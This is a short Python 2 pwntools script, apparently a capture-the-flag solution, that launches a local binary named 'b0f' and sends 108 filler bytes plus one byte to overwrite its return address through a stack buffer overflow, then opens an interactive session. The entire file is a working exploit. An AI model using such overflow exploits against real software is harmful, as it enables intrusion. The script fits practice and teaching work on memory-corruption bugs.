from pwn import *


r = process('./b0f')
#print util.proc.pidof(r)
print r.recv()

shellcode = 'A'*108 + '\x15'

r.sendline(shellcode)

r.interactive()
